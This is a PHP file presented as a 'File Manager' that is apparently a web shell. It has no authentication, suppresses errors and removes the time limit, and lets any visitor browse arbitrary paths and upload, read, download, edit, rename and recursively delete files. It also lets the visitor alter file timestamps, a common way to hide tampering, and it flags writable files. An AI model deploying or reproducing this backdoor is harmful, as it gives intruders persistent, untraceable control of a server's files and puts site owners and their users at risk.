<?php
error_reporting(0);
set_time_limit(0);

function perms($file) {
    $perms = fileperms($file);

    switch ($perms & 0xF000) {
        case 0xC000:
            $info = 's';
            break;
        case 0xA000:
            $info = 'l';
            break;
        case 0x8000:
            $info = '-';
            break;
        case 0x6000:
            $info = 'b';
            break;
        case 0x4000:
            $info = 'd';
            break;
        case 0x2000:
            $info = 'c';
            break;
        case 0x1000:
            $info = 'p';
            break;
        default:
            $info = 'u';
    }

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') :
        (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') :
        (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') :
        (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

if (isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    $path = getcwd();
}
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);

if (isset($_FILES['files'])) {
    foreach ($_FILES['files']['tmp_name'] as $key => $tmp_name) {
        $name = $_FILES['files']['name'][$key];
        $tmp_name = $_FILES['files']['tmp_name'][$key];
        if (move_uploaded_file($tmp_name, "$path/$name")) {
            echo "Upload Successful: $name<br/>";
        } else {
            echo "Upload Failed: $name<br/>";
        }
    }
}

if (isset($_POST['create_folder'])) {
    $new_folder = $_POST['new_folder'];
    if (mkdir("$path/$new_folder")) {
        echo "Folder created successfully: $new_folder<br/>";
    } else {
        echo "Failed to create folder: $new_folder<br/>";
    }
}

if (isset($_POST['create_file'])) {
    $new_file = $_POST['new_file'];
    if (touch("$path/$new_file")) {
        echo "File created successfully: $new_file<br/>";
    } else {
        echo "Failed to create file: $new_file<br/>";
    }
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Length: ' . filesize($file));
        flush();
        readfile($file);
        exit;
    }
}

if (isset($_POST['delete'])) {
    $delete_path = $_POST['delete'];
    if (is_dir($delete_path)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($delete_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($files as $fileinfo) {
            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            $todo($fileinfo->getRealPath());
        }
        rmdir($delete_path);
    } else {
        unlink($delete_path);
    }
}

if (isset($_POST['rename'])) {
    $old_name = $_POST['old_name'];
    $new_name = $_POST['new_name'];
    if (rename($old_name, $new_name)) {
        echo "Rename successful<br/>";
    } else {
        echo "Rename failed<br/>";
    }
}

if (isset($_POST['nano'])) {
    $file_path = $_POST['file_path'];
    $content = $_POST['content'];
    if (file_put_contents($file_path, $content)) {
        echo "File edited successfully<br/>";
    } else {
        echo "File edit failed<br/>";
    }
}

if (isset($_POST['change_time'])) {
    $file_path = $_POST['file_path'];
    $new_time = strtotime($_POST['new_time']);
    if (touch($file_path, $new_time, $new_time)) {
        echo "File time changed successfully<br/>";
    } else {
        echo "Failed to change file time<br/>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Manager</title>
</head>

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2e2e2e;
            color: #ffffff;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid #ffffff;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #4CAF50;
        }
        tr:nth-child(even) {
            background-color: #333333;
        }
        tr:nth-child(odd) {
            background-color: #3e3e3e;
        }
        a {
            color: #4CAF50;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .button {
            background-color: #4CAF50;
            border: none;
            color: white;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
        }
        .button-red {
            background-color: #f44336;
        }
    </style>
<body>
    <h1>File Manager</h1>
    <div>
        Path:
        <?php
        foreach ($paths as $id => $pat) {
            if ($pat == '' && $id == 0) {
                echo '<a href="?path=/">/</a>';
                continue;
            }
            if ($pat == '') continue;
            echo '<a href="?path=';
            for ($i = 0; $i <= $id; $i++) {
                echo "$paths[$i]";
                if ($i != $id) echo "/";
            }
            echo '">' . $pat . '</a>/';
        }
        ?>
    </div>
    <form enctype="multipart/form-data" method="POST">
        <input type="file" name="files[]" multiple>
        <input type="submit" value="Upload">
    </form>
    <form method="POST">
        <input type="text" name="new_folder" placeholder="New folder name">
        <input type="submit" name="create_folder" value="Create Folder">
    </form>
    <form method="POST">
        <input type="text" name="new_file" placeholder="New file name">
        <input type="submit" name="create_file" value="Create File">
    </form>

    <?php
    if (isset($_GET['filesrc'])) {
        $file = $_GET['filesrc'];
        echo "<h2>Viewing File: " . htmlspecialchars(basename($file)) . "</h2>";
        echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
    } elseif (isset($_GET['nano'])) {
        $file = $_GET['nano'];
        echo "<h2>Editing File: " . htmlspecialchars(basename($file)) . "</h2>";
        echo '<form method="POST">
            <textarea name="content" rows="20" cols="80">' . htmlspecialchars(file_get_contents($file)) . '</textarea><br/>
            <input type="hidden" name="file_path" value="' . $file . '">
            <input type="submit" name="nano" value="Save Changes">
        </form>';
    } else {
        echo '<table>';
        echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified Time</th><th>Creation Time</th><th>Actions</th></tr>';

        $scandir = scandir($path);
        foreach ($scandir as $dir) {
            if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
            echo '<tr>
                <td><i class="fa fa-folder"></i> <a href="?path=' . $path . '/' . $dir . '">' . $dir . '</a></td>
                <td><center>--</center></td>
                <td><center>';
            if (is_writable("$path/$dir")) echo '<font color="lime">';
            elseif (!is_readable("$path/$dir")) echo '<font color="red">';
            echo perms("$path/$dir");
            if (is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
            echo '</center></td>
                <td><center>' . date("d-M-Y H:i", filemtime("$path/$dir")) . '</center></td>
                <td><center>' . date("Y-m-d H:i:s", filectime("$path/$dir")) . '</center></td>
                <td><center>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="delete" value="' . "$path/$dir" . '">
                        <input type="submit" value="Delete" class="button button-red">
                    </form>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="old_name" value="' . "$path/$dir" . '">
                        <input type="text" name="new_name" placeholder="New Name">
                        <input type="submit" name="rename" value="Rename" class="button">
                    </form>
                </center></td>
            </tr>';
        }

        foreach ($scandir as $file) {
            if (!is_file("$path/$file")) continue;
            $size = filesize("$path/$file") / 1024;
            $size = round($size, 3);
            if ($size >= 1024) {
                $size = round($size / 1024, 2) . ' MB';
            } else {
                $size = $size . ' KB';
            }
            echo '<tr>
                <td><i class="fa fa-file"></i> <a href="?filesrc=' . $path . '/' . $file . '&path=' . $path . '">' . $file . '</a></td>
                <td><center>' . $size . '</center></td>
                <td><center>';
            if (is_writable("$path/$file")) echo '<font color="lime">';
            elseif (!is_readable("$path/$file")) echo '<font color="red">';
            echo perms("$path/$file");
            if (is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
            echo '</center></td>
                <td><center>' . date("d-M-Y H:i", filemtime("$path/$file")) . '</center></td>
                <td><center>' . date("Y-m-d H:i:s", filectime("$path/$file")) . '</center></td>
                <td><center>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="delete" value="' . "$path/$file" . '">
                        <input type="submit" value="Delete" class="button button-red">
                    </form>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="old_name" value="' . "$path/$file" . '">
                        <input type="text" name="new_name" placeholder="New Name">
                        <input type="submit" name="rename" value="Rename" class="button">
                    </form>
                    <form method="GET" style="display:inline;">
                        <input type="hidden" name="nano" value="' . "$path/$file" . '">
                        <input type="submit" value="Edit" class="button">
                    </form>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="file_path" value="' . "$path/$file" . '">
                        <input type="text" name="new_time" placeholder="New Time (Y-m-d H:i:s)">
                        <input type="submit" name="change_time" value="Change Time" class="button">
                    </form>
                    <a href="?download=' . $path . '/' . $file . '" class="button">Download</a>
                </center></td>
            </tr>';
        }
        echo '</table>';
    }
    ?>
</body>
</html>

